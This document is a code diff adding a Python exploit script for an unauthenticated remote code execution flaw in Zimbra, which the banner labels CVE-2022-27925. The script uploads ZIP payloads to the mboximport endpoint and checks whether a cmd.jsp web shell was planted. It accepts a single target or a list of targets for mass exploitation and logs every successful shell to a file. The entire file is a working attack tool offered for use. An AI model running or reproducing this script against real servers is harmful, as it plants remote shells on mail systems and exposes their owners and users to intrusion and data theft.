@@ -1,0 +1,119 @@
+import requests
+import os
+import argparse
+from termcolor import colored
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+version = 0.1
+
+# exploit_path = ["service/extension/backup/mboximport?account-name=valid_email&account-status=1&ow=cmd", "service/extension/backup/mboximport?account-name=valid_email&ow=2&no-switch=1&append=1"]
+exploit_path = ["service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd", "service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]
+shell_list = ["312.zip", "313.zip", "314.zip"]
+
+artwork = '''
+
+ ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗ ███████╗ █████╗ ██████╗ ███████╗
+██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗╚════██║██╔══██╗╚════██╗██╔════╝
+██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝    ██╔╝╚██████║ █████╔╝███████╗
+██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝██╔═══╝    ██╔╝  ╚═══██║██╔═══╝ ╚════██║
+╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████╗      ███████╗   ██║   █████╔╝███████╗███████║
+ ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝      ╚══════╝   ╚═╝   ╚════╝ ╚══════╝╚══════╝
+																											
+		
+Zimbra Unauthenticated Remote Code Execution Exploit (CVE-2022-27925)
+Use at your own risk!
+'''
+
+def sendExploit(host, filename, url):
+	
+	data_payload = open(filename, 'rb')
+
+	headers = {'content-type': 'application/x-www-form-urlencoded'}
+
+	proxy = {}
+
+	try:
+		resp = requests.post(host, timeout=20, data=data_payload, proxies=proxy, verify=False, headers=headers)
+		
+		# print(resp.status_code)
+
+		if resp.status_code == 401:
+			# stautus = checkShell(url)
+			# host = url + "/zimbraAdmin/cmd.jsp"
+			# resp2 = requests.get(host,verify=False, timeout=20)
+			# stautus = resp2.status_code
+			# if stautus == 200:
+			return
+
+	except Exception as e:
+		# print(e)
+		pass
+
+	data_payload.close()
+
+def checkShell(url):
+
+	host = url + "/zimbraAdmin/cmd.jsp"
+	# print("Checking url " + url)
+	try:
+		resp = requests.get(host,verify=False, timeout=20)
+
+		if resp.status_code == 200:
+			# print("[+] Success shell: " + host)
+			print(colored("[+] Success shell: {}" .format(host), "green"))
+			with open("success.txt", "a+") as f:
+				f.write(host + "\n")
+		else:
+			# print("[+] Fail to get shell")
+			print(colored("[+] Fail to get shell", "yellow"))
+	
+	except Exception as e:
+		print(colored("[+] Error: {}" .format(e), "red"))
+		pass
+
+def exploit(url):
+	print("Checking url " + url)
+	for path in exploit_path:
+		# path = path.replace("valid_email", email)
+		host = url + "/" + path
+		
+		for shell in shell_list:
+			shell_zip = os.getcwd() + "/" + shell
+			sendExploit(host, shell_zip, url)
+			
+	checkShell(url)
+
+
+def banner():
+	## version
+	print(colored("version {}" .format(version), "green", attrs=['bold']))
+	print(artwork)
+	
+if __name__ == "__main__":
+
+	## version
+	banner()
+
+	## parse argument
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-t', '--target', help='The URL of the target, eg: http://127.0.0.1', default=False)
+	parser.add_argument("-l", "--list", action="store", help="List of target url saperated with new line", default=False)
+	args = parser.parse_args()
+
+	if args.target is not False:
+		
+		exploit(args.target) 
+	
+	elif args.list is not False:
+				
+		with open(args.list) as targets:
+			
+			for target in targets:
+				target = target.rstrip()
+				exploit(target) 
+
+	else:
+
+		parser.print_help()
+		parser.exit()
